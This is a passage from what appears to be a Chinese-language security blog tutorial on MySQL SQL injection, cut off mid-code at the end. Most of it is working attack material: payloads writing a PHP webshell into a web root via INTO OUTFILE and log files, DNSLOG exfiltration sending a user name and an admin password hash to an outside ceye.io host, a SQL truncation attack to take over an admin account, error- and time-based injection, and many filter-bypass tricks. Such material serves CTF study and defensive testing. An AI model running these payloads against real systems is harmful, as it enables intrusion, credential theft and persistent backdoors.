@<span class="hljs-variable">@global</span>.secure_file_priv;<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> &quot;secure_file_priv&quot;;<br></code></pre></td></tr></table></figure><p><img src="/wzimg/5.png" alt="b"></p><h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><p><code>Mysql</code>读取文件通常使用<code>load_file</code>函数，语法如下：<br><code>select load_file(file_path);</code><br>第二种：<br><code>load data infile “/etc/passwd” into table test FIELDS TERMINATED BY ‘\n’;</code> #读取服务端文件<br>第三种：<br><code>load data local infile “/etc/passwd” into table test FIELDS TERMINATED BY ‘\n’; </code>#读取客户端文件</p><p>限制：</p><ul><li>前两种需要secure-file-priv无值或为有利目录。</li><li>都需要知道要读取的文件所在的绝对路径。</li><li>要读取的文件大小必须小于max_allowed_packet所设置的值</li></ul><h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><p>常见的写文件操作如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,&quot;&lt;?php @assert($_POST[&#x27;w0s1np&#x27;]);?&gt;&quot; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/var/www/html/1.php&#x27;</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-number">2</span>,&quot;&lt;?php @assert($_POST[&#x27;w0s1np&#x27;]);?&gt;&quot; <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;/var/www/html/1.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>限制：</p><ul><li><code>secure-file-priv</code>无值或为可利用的目录</li><li>需知道目标目录的绝对目录地址</li><li>目标目录可写，<code>mysql</code>的权限足够</li></ul><h5 id="日志法"><a href="#日志法" class="headerlink" title="日志法"></a>日志法</h5><p>由于mysql在5.5.53版本之后，<code>secure-file-priv</code>的值默认为NULL，这使得正常读取文件的操作基本不可行。我们这里可以利用<code>mysql</code>生成日志文件的方法来绕过。<br><code>mysql</code>日志文件的一些相关设置可以直接通过命令来进行：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-comment">//请求日志</span><br>mysql&gt; <span class="hljs-built_in">set</span> <span class="hljs-built_in">global</span> general_log_file = <span class="hljs-string">&#x27;/var/www/html/1.php&#x27;</span>;<br>mysql&gt; <span class="hljs-built_in">set</span> <span class="hljs-built_in">global</span> general_log = <span class="hljs-keyword">on</span>;<br><span class="hljs-comment">//慢查询日志</span><br>mysql&gt; <span class="hljs-built_in">set</span> <span class="hljs-built_in">global</span> slow_query_log_file=<span class="hljs-string">&#x27;/var/www/html/2.php&#x27;</span><br>mysql&gt; <span class="hljs-built_in">set</span> <span class="hljs-built_in">global</span> slow_query_log=<span class="hljs-number">1</span>;<br><span class="hljs-comment">//还有其他很多日志都可以进行利用</span><br><span class="hljs-params">...</span><br></code></pre></td></tr></table></figure><p>之后我们在让数据库执行满足记录条件的恶意语句即可。</p><p>限制：</p><ul><li>权限够，可以进行日志的设置操作</li><li>知道目标目录的绝对路径</li></ul><h4 id="DNSLOG外带数据-目标系统为Windows才可用"><a href="#DNSLOG外带数据-目标系统为Windows才可用" class="headerlink" title="DNSLOG外带数据(目标系统为Windows才可用)"></a>DNSLOG外带数据(目标系统为Windows才可用)</h4><p>payload:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">load_file(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-string">&#x27;.xxxx.ceye.io\xxxx&#x27;</span>))<br><br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/mysql.php?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,load_file(CONCAT(<span class="hljs-string">&#x27;\\&#x27;</span>,(<span class="hljs-keyword">SELECT</span> hex(pass) <br><span class="hljs-keyword">FROM</span> test.test_user <span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.mysql.nk40ci.ceye.io\abc&#x27;</span>))<br></code></pre></td></tr></table></figure><p>应用场景：</p><ul><li>三大注入无法使用</li><li>有文件读取权限及secure-file-priv无值。</li><li>不知道网站/目标文件/目标目录的绝对路径</li><li>目标系统为Windows</li></ul><p>在<code>Windows</code>中，路径以\开头的路径在<code>Windows</code>中被定义为<code>UNC</code>路径，相当于网络硬盘一样的存在，所以我们填写域名的话，<code>Windows</code>会先进行<code>DNS</code>查询。但是对于<code>Linux</code>来说，并没有这一标准，所以<code>DNSLOG</code>在<code>Linux</code>环境不适用。注：<code>payload</code>里的四个\中的两个\是用来进行转义处理的。</p><h3 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h3><p>在<code>SQL</code>中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说<code>“w0s1np”</code>等同于<code>“w0s1np ”</code></p><p>先举个例子：<br>建立一个用户表：做了25个字符的限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">CREATE TABLE users(<br>    username varchar(<span class="hljs-number">25</span>),<br>    password varchar(<span class="hljs-number">25</span>)<br>)<br></code></pre></td></tr></table></figure><p>注册代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1:3307&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;db&quot;</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());<br>&#125;<br><span class="hljs-variable">$username</span> = addslashes(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$password</span> = addslashes(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$rs</span> = mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$rs</span>-&gt;fetch_row())&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;账号已注册&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$sql2</span> = <span class="hljs-string">&quot;insert into users values(&#x27;<span class="hljs-subst">$username</span>&#x27;,&#x27;<span class="hljs-subst">$password</span>&#x27;)&quot;</span>;<br>    mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql2</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;注册成功&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>登录判断代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1:3307&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;db&quot;</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());<br>&#125;<br><span class="hljs-variable">$username</span> = addslashes(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$password</span> = addslashes(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where username = &#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;;&quot;</span>;<br><span class="hljs-variable">$rs</span> = mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$rs</span>-&gt;fetch_row())&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]=<span class="hljs-variable">$password</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上面的代码无编码问题，且对用户输入做了单引号处理，但是前边创建表格的语句限制了<code>username</code>和<code>password</code>的长度最大为20，若我们插入数据超过25，MYSQL则会截取前边的25个字符进行插入。</p><p>而对于SELECT查询请求，若查询的数据超过25长度，也不会进行截取操作，这就产生了一个问题。</p><p>通常对于注册处的代码来说，需要先判断注册的用户名是否存在，再进行插入数据操作。如我们注册一个<code>username=admin[25个空格]&amp;password=123456</code>的账号，服务器会先查询<code>admin[25个空格]x</code>的用户是否存在，若存在，则不能注册。若不存在，则进行插入数据的操作。而此处我们限制了<code>username</code>与<code>password</code>字段长度最大为25，所以我们实际插入的数据为<code>username=admin[20个空格]&amp;password=123456。</code></p><p>接着进行登录的时，我们使用：<code>username=admin&amp;password=123456</code>进行登录，即可成功登录<code>admin</code>的账号。</p><h3 id="Insert-amp-Update-amp-Delete注入"><a href="#Insert-amp-Update-amp-Delete注入" class="headerlink" title="Insert&amp;Update&amp;Delete注入"></a>Insert&amp;Update&amp;Delete注入</h3><p><code>insert、update、Delete</code>一般使用报错注入，白盒也可以采用闭合的方式注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x7e</span>)));<br>ERROR <span class="hljs-number">1105</span> (HY000): XPATH syntax error: <span class="hljs-string">&#x27;~root@localhost~&#x27;</span><br>mysql<span class="hljs-operator">&gt;</span> update users <span class="hljs-keyword">set</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x7e</span>));<br>ERROR <span class="hljs-number">1105</span> (HY000): XPATH syntax error: <span class="hljs-string">&#x27;~root@localhost~&#x27;</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x7e</span>));<br>ERROR <span class="hljs-number">1105</span> (HY000): XPATH syntax error: <span class="hljs-string">&#x27;~root@localhost~&#x27;</span><br></code></pre></td></tr></table></figure><p>如果没有错误回显就可以使用延时注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">or</span> (if((length(database())<span class="hljs-operator">=</span><span class="hljs-number">8</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)));<br>ERROR <span class="hljs-number">1062</span> (<span class="hljs-number">23000</span>): Duplicate entry <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;PRIMARY&#x27;</span><br>mysql<span class="hljs-operator">&gt;</span> update users <span class="hljs-keyword">set</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if((length(database())<span class="hljs-operator">=</span><span class="hljs-number">8</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>);<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">5.00</span> sec)<br><span class="hljs-keyword">Rows</span> matched: <span class="hljs-number">0</span>  Changed: <span class="hljs-number">0</span>  Warnings: <span class="hljs-number">0</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if((length(database())<span class="hljs-operator">=</span><span class="hljs-number">8</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>);<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">5.00</span> sec)<br></code></pre></td></tr></table></figure><h3 id="Mysql下Limit注入方法"><a href="#Mysql下Limit注入方法" class="headerlink" title="[Mysql下Limit注入方法]"></a>[Mysql下Limit注入方法]</h3><p><strong>此方法适用于MySQL 5.x中，在limit语句后面的注入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIM<br></code></pre></td></tr></table></figure><p><strong>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的。<br>报错注入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users where id&gt;1 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); <br>ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.53&#39;<br></code></pre></td></tr></table></figure><p><strong>时间注入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where id&gt;1 order by id limit 1,1 procedure analyse((select extractvalue<br>(rand(),concat(0x3a,(IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1))))),1);<br></code></pre></td></tr></table></figure><h3 id="注入时还可能有的一些方式"><a href="#注入时还可能有的一些方式" class="headerlink" title="注入时还可能有的一些方式"></a>注入时还可能有的一些方式</h3><p>二次注入：就是在有注册和登录的地方进行注入，其实CTF都有套路的，看到SQL注入题型存在修改密码的一般都是二次注入</p><p>遇到转义的时候，如果是GBK编码，我们可以使用宽字节注入，就是在转义的前面加一个<code>%df</code>就好，原因就是<code>%df</code>和反斜杠的<code>%5c</code>连起来是中国汉字‘连’。</p><p>有些题还可能存在<code>cookie</code>注入，这个也只是一种方式，其实也是使用<code>union</code>注入就好了，只不过是在<code>cookie</code>罢了</p><p>还可能存在<code>xff</code>，因为<code>xff</code>就是浏览器认为我们的<code>ip</code>地址，而且我们可以自己造假，所以我们就可以在<code>xff</code>里面也来注入</p><p>然后常见的过滤手法就是大小写，编码，内联注释，双写。</p><p>常见双写：aandnd  ununionion seselectlect  自己体会如何双写的。</p><p>然后常见可能被过滤的字符：</p><p>union and or select order 空格这些直接绕过就好了，主要就是自己判断什么被过滤了</p><p><code>load_file</code>读取文件内容</p><p>load_file()</p><p>1、必须有权限读取并且文件必须完全可读<br>　<br>2、欲读取文件必须在服务器上</p><p>3、必须指定文件完整的路径</p><p>4、欲读取文件必须小于 max_allowed_packet</p><p>如果存在以上条件，还可以注入，那么就可以用load_file()读文件<br>例如:<br><code>http://127.0.0.1/index.php?age=-1 union select 1,2,3,4,load_file(&#39;H:/wamp64/www/233.php&#39;)</code></p><h3 id="一些绕过手法总结"><a href="#一些绕过手法总结" class="headerlink" title="一些绕过手法总结"></a>一些绕过手法总结</h3><p>空格绕过：</p><p>多层括号嵌套，改用+号，使用注释/**/<br>and/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略<br><code>%09, %0a, %0b, %0c, %0d, %a0</code>等部分不可见字符可也代替空格（因为Windows的解析机制无法使用特殊字符代替空格，需要Linux的服务器环境才行）</p><p>and or绕过：</p><p>直接&amp;&amp; ||替换即可</p><p>引号绕过：</p><p>使用16进制绕过，例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot;<br></code></pre></td></tr></table></figure><p>换为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span><br></code></pre></td></tr></table></figure><p>因为<code>　users</code>的十六进制的字符串是<code>7573657273</code>。</p><p>也可通过进制转换函数表示成其他进制或者使用其他编码，如char()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">FROM</span> Users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">97</span>, <span class="hljs-number">100</span>, <span class="hljs-number">109</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>)<br></code></pre></td></tr></table></figure><p>还可以使用<code>%2527</code><br>为<code>%25</code>解码为<code>%</code>,结合后面的27也就是<code>%27</code>也就是<code>’</code>，所以成功绕过过滤</p><p>information_schema被过滤/拦截</p><p>利用<code>innodb</code>存储引擎(需要Mysql版本在5.5.x后并且<code>Mysql</code>开启了<code>innoDB</code>引擎)，例子如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name<span class="hljs-operator">=</span>database();<br><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> mysql.innodb_index_stats <span class="hljs-keyword">where</span> database_name<span class="hljs-operator">=</span>database();<br></code></pre></td></tr></table></figure><p>接下来的四个只能用于查表名，无法查询列名，所以进一步获取数据还需无列名注入</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">sys.schem<span class="hljs-built_in">a_auto</span>_increment_columns<br>sys.x$schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br>sys.schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br>sys.x$ps_schem<span class="hljs-built_in">a_table</span>_statistics_io<br></code></pre></td></tr></table></figure><p>逗号被过滤：</p><ol><li><p>union select 逗号被过滤：</p><p>利用join注入，payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> ctf_test <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b;<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">等价于：<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> ctf_test <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure></li><li><p>功能函数逗号被过滤，例如：substr(),mid()</p><p>利用from…for…绕过，pauload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> ctf_test <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">and</span> if(mid((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()) <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure></li><li><p>limit中逗号被过滤</p><p>利用limit…offset…绕过，payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br># 等价于下面这条<span class="hljs-keyword">SQL</span>语句<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>limit 9 offset 4<code>表示从第十行开始返回4行，返回的是</code>10,11,12,13</p></li></ol><p>等于符号被过滤：</p><p>利用like,regexp,between…and…,rlike绕过，payload如下：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if(<span class="hljs-name">mid</span>(<span class="hljs-name">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) like &#x27;r%&#x27;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">2</span>))<span class="hljs-comment">;</span><br>if(<span class="hljs-name">mid</span>(<span class="hljs-name">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) rlike &#x27;^ro&#x27;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">2</span>))<span class="hljs-comment">;</span><br>if(<span class="hljs-name">mid</span>(<span class="hljs-name">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) regexp &#x27;^ro&#x27;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">2</span>))<span class="hljs-comment">;</span><br>if(<span class="hljs-name">mid</span>(<span class="hljs-name">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) between &#x27;r&#x27; and &#x27;r&#x27;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">2</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">between </span>a <span class="hljs-keyword">and </span><span class="hljs-keyword">b：</span><br><span class="hljs-keyword">between </span><span class="hljs-number">1</span> <span class="hljs-keyword">and </span><span class="hljs-number">1</span><span class="hljs-comment">; 等价于 =1</span><br></code></pre></td></tr></table></figure><p>关键字绕过：</p><ol><li><p>使用注释符绕过</p><p>常用注释符：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>，-- , <span class="hljs-regexp">/**/</span>, <span class="hljs-comment">#, --+, -- -, ;,%00,--a</span><br></code></pre></td></tr></table></figure></li><li><p>大写写绕过</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">id=<span class="hljs-number">-1</span>&#x27;<span class="hljs-built_in">UnIoN</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">SeLeCT</span><br></code></pre></td></tr></table></figure></li><li><p>内联注释绕过</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/*!union*/</span><br></code></pre></td></tr></table></figure></li><li><p>大小写绕过</p><p>常见双写：aandnd  ununionion seselectlect  自己体会如何双写的。</p></li></ol><p>编码绕过：</p><p>　如<code>URLEncode</code>编码，<code>ASCII,HEX,unicode</code>编码绕过：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>即%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">31</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">31</span>，而Test也可以为CHAR(<span class="hljs-number">101</span>)+CHAR(<span class="hljs-number">97</span>)+CHAR(<span class="hljs-number">115</span>)+CHAR(<span class="hljs-number">116</span>)。<br></code></pre></td></tr></table></figure><p>等价函数替换绕过：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">hex()、bin() ==&gt; ascii()<br><br>benchmark() ==&gt;sleep()<br><br>concat_ws()==&gt;group_concat()<br><br>mid()、substr() ==&gt; substring()<br><br>@@<span class="hljs-keyword">user</span> ==&gt; <span class="hljs-keyword">user</span>()<br><br>@@datadir ==&gt; datadir()<br><br>举例：substring()和substr()无法使用时：?id=<span class="hljs-number">1</span>+<span class="hljs-keyword">and</span>+ascii(lower(mid((<span class="hljs-keyword">select</span>+pwd+<span class="hljs-keyword">from</span>+users+<span class="hljs-keyword">limit</span>+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">74</span>　<br><br>或者：<br>substr((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;password&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) = <span 